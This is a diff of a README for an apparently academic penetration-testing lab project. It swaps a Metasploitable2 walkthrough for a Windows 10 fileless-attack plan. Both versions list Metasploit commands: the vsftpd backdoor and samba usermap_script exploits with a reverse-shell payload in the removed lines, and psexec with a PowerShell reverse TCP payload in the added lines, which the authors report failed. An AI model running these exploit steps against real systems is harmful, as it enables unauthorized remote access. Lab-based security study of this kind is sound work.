@@ -7,16 +7,18 @@
 
 ### Project Description
 
-- The purpose of this project is to conduct offensive security research focused on identifying 
-vulnerabilities within IT systems and improving cybersecurity defenses. The project will simulate real-world attacks
-using a controlled environment that includes a Kali Linux VM and a Metasploitable2 VM, providing a platform for
-vulnerability discovery and exploitation. The primary tools used in this research will be Metasploit Framework and Nmap,
-focusing on how they can be utilized to find and exploit vulnerabilities.
+- The purpose of this project is to conduct offensive security research primarily focused on identifying, exploiting, 
+and mitigating fileless malware attacks within a Windows-based environment to improve cybersecurity defenses against
+in-memory code execution. This project will simulate real-world fileless attacks within a controlled environment using 
+a Kali Linux VM and a Windows 10 VM, providing a platform for fileless vulnerability discovery and exploitation. The 
+tools that will be used in this research are Metasploit Framework, Nmap, and custom Python scripts, focusing on how 
+these tools can be utilized to discover and exploit such attacks, providing insights for enhancing traditional 
+cybersecurity defenses against fileless malware.
 
 ### Tools Used
 
 - `Oracle VirtualBox VM` a virtualization software used for creating VMs
-- `Metasploitable2 VM` a VM intentionally configured to have exploitable vulnerabilities, also the target VM for this project
+- `Windows 10 VM` a base Windows 10 VM, also the target VM for this project
 - `Kali Linux VM` a VM configured with pre-installed offensive security tools, also the attacking VM in this project
 - `Nmap` a network mapping Linux tool used to scan IP addresses and ports on a network
 - `Metasploit Framework` a penetration testing Linux tool used for identifying and exploiting vulnerabilities on a system
@@ -25,24 +27,24 @@ focusing on how they can be utilized to find and exploit vulnerabilities.
 
 # Phase 1 Objectives
 
-- Set up the `Kali Linux VM` as the attack system and the `Metasploitable2 VM` as the target.
-- Use `Nmap` for port scanning and discovering vulnerabilities on the target system, followed by using the `Metasploit
-Framework` to exploit the vulnerabilities.
+- Set up the `Kali Linux VM` as the attack system
+- Set up the `Windows 10 VM` as the target system.
+- Use `Nmap` for port scanning and discovering vulnerabilities on the target system
 - Document the technical steps taken and our findings.
 
 
-# Phase 1.1 - Setting up the Metasploitable 2 VM
+# Phase 1.1 - Setting up the Windows 10 VM
 
 - Download `Oracle Virtual Box VM` software from https://www.virtualbox.org
-- Download the `Metasploitable2` iso image from http://sourceforge.net/projects/metasploitable/files/Metasploitable2/metasploitable-linux-2.0.0.zip/download
+- Download the `Windows 10` iso image from https://www.microsoft.com/en-us/software-download/windows10
 - Extract the files from the downloaded zip file
 - Create a new VM instance in VirtualBox with the following hardware requirements:
   + **2 GB Memory**
   + **1 CPU**
-  + **Create a Virtual Hard Disk (or Use an Existing Hard Disk File)**
-- Install the `Metasploitable2` iso image onto the newly created VM instance
-- Change the **Network Adapter** to **Host-only Adapter** in the `Metasploitable2 VM` machine settings
-- Start the `Metasploitable2 VM` 
+  + **Create a Virtual Hard Disk with 60 GB of storage**
+- Install the `Windows 10` iso image onto the newly created VM instance
+- Change the **Network Adapter** to **Host-only Adapter** in the `Windows 10` machine settings
+- Start the `Windows 10 VM` 
 
 
 # Phase 1.2 - Setting up the Kali Linux VM
@@ -69,76 +71,107 @@ Framework` to exploit the vulnerabilities.
 
 # Phase 1.3 - Port Scanning using Nmap
 
-- The first step is to boot up the `Kali Linux VM` and the `Metasploitable2 VM`
+- The first step is to boot up the `Kali Linux VM` and the `Windows 10 VM`
 - Once both VMs are started, we need to obtain the IP address of the target system
-- To do this, run the following command in the `Metasploitable2 VM` terminal
+- To do this, run the following command in the `Windows 10 VM` terminal
 
 **Displays IP configuration information on the system**
 ``` 
-ifconfig
+ipconfig
 ```
 
-- Next, we will run an `Nmap` port scan to find all the open ports on the `Metasploitable2 VM` using the following command
+- Next, we will run an `Nmap` port scan to find all the open ports on the `Windows 10 VM` using the following command
 
 **Scans all 65,535 ports on the target system and returns every open port**
 ```
 nmap -p- <target ip>
 ```
 
-- A few exploitable ports that were open on our target system are as follows
-  + `ftp port 21`
-  + `telnet port 23`
-  + `samba port 445`
+- Some exploitable ports that were open on our target system are as follows:
+  + `SMB port 139`
+  + `SMB port 445`
 
-# Phase 1.4 - Exploiting using Metasploit Framework
+**Screenshot of our nmap scan**
 
-- Now that we know the open ports on the target system, we can use the `Metasploit Framework` tool on our `Kali Linux VM` to exploit some vulnerabilities
-- Since we know that `ftp port 21` is open, we can exploit an FTP shell access vulnerability on the target system using the following commands
+![](./images/Nmap_SS.png)
 
-**Loads the exploit to target an FTP backdoor vulnerability granting unauthorized access**
+---
+
+# Phase 2 Objectives
+
+- Use `Metasploit Framework` to exploit an in-memory vulnerability
+- Create a `Custom Python Script` to automate port scanning and exploitation
+- Document the technical steps taken and our findings.
+
+# Phase 2.1 - Exploiting using Metasploit Framework
+
+- Now, we can use `Metasploit Framework` on our `Kali Linux VM` to exploit some vulnerabilities on these open ports
+- Since `SMB ports 139 and 445` are open, we can attempt to exploit a PowerShell Reverse TCP vulnerability on the 
+target system using the following commands
+
+**Enter the Metasploit Framework terminal using this command**
 ```
-use exploit/unix/ftp/vsftpd_234_backdoor
+sudo msfconsole
 ```
-**Sets the remote host to the IPv4 address of the target system**
+![](./images/msfconsole_command.png)
+
+**We can search exploits specific to PowerShell using the following command**
 ```
-set RHOST <target ip>
+search powershell
 ```
+
+![](./images/search_powershell_command.png)
+
+**Exploits an SMB vulnerability to execute a payload in memory using PowerShell**
+```
+use exploit/windows/smb/psexec
+```
+
+![](./images/use_exploit_command.png)
+
+**Setting options for our exploit, such as payload, RHOST, and LHOST**
+```
+set payload windows/x64/powershell_reverse_tcp
+set RHOST <target_ip>
+set LHOST <attacker_ip>
+```
+
+![](./images/exploit_settings.png)
+
 **Runs the exploit**
 ```
 exploit
 ```
+![](./images/exploit_command.png)
 
-- Next, we can run the following command to gain remote access to the target system via the open `telnet port 23`
+**As we can see, our exploit was unsuccessful because we were denied access to the target system.
+We can configure additional options for this exploit to try working around this error.**
 
-**Connects to a remote system using the telnet protocol using the format `service target_ip port_number`**
+**Setting additional options for our exploit, such as SMBuser and SMBpass for authentication**
+```
+set SMBuser <target_username>
+set SMBpass <target_password>
+```
+![](./images/exploit_settings2_command.png)
 
-```
-telnet <target ip> 23
-```
-
-- We can also access the shell of the target system via the `samba port 445` by using the following commands
-
-**Loads the exploit to target a samba vulnerability**
-```
-use exploit/multi/samba/usermap_script
-```
-**Sets remote host IPv4 address of target system**
-```
-set RHOST <target ip>
-```
-**Sets payload to open a reverse shell**
-```
-set payload cmd/unix/reverse
-```
-**Sets the IPv4 address of host machine where the reverse shell will connect**
-```
-set LHOST <host ip>
-```
-**Sets the port on the host machine that will listen for the reverse shell**
-```
-set LPORT 4444
-```
-**Runs the exploit**
+**Trying the exploit again**
 ```
 exploit
 ```
+
+![](./images/exploit2_command.png)
+
+**As we can see, another unsuccessful attempt to create a Reverse TCP connection through PowerShell using open SMB ports.
+At this point in our research, we are unsure how to proceed with exploiting a fileless attack through PowerShell via 
+open ports on a Windows-based target system. However, we will continue to refine our methods to successfully create an
+effective fileless attack on our Windows 10 VM.**
+
+# Phase 2.2 - Automation using Python
+
+-  Our objective here is to create a functional Python script to automate port scanning and vulnerability exploitation
+- We will be using `Python3` for this phase of our research
+
+**Our `Custom Python Script` can be found here:** https://github.com/eisenbeisr/CSC466-OffensiveSecurityResearch
+
+
+---
